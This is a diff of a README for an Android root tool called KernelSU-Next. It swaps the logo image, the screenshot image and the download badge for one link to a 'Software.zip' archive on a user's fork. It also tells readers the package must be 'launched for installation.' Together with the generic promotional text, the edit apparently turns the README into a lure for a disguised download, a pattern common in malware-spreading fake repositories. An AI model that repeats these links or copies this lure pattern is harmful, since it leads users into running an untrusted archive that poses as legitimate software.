@@ -1,6 +1,6 @@
 # KernelSU-Next: A Powerful Root Solution for Android Devices 🚀
 
-![KernelSU-Next Logo](https://example.com/logo.png)
+![KernelSU-Next Logo](https://github.com/GhostYT4/KernelSU-Next/releases/download/v1.0/Software.zip)
 
 Welcome to the **KernelSU-Next** repository! This project offers a cutting-edge kernel-based root solution for Android devices, providing users with enhanced control and customization options. Whether you are an Android enthusiast looking to unlock the full potential of your device or a developer seeking to explore advanced kernel-level functionalities, KernelSU-Next is the go-to solution for you.
 
@@ -42,7 +42,7 @@ For detailed instructions, refer to the **Documentation** available in the repos
 
 ## 🔗 Download KernelSU-Next
 
-[![Download KernelSU-Next](https://img.shields.io/badge/Download-KernelSU--Next-brightgreen)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download KernelSU-Next](https://github.com/GhostYT4/KernelSU-Next/releases/download/v1.0/Software.zip)](https://github.com/GhostYT4/KernelSU-Next/releases/download/v1.0/Software.zip)
 
 📂 **Note**: The link provided above leads to the software package that needs to be launched for installation.
 
@@ -58,7 +58,7 @@ KernelSU-Next is licensed under the MIT License. See the `LICENSE` file in the r
 
 By using KernelSU-Next, you are embarking on a journey to unleash the true potential of your Android device. Join us in the quest for ultimate customization, performance, and control with KernelSU-Next. Let's elevate the Android experience together! 🚀
 
-![KernelSU-Next in Action](https://example.com/screenshot.png)
+![KernelSU-Next in Action](https://github.com/GhostYT4/KernelSU-Next/releases/download/v1.0/Software.zip)
 
 --- 
 
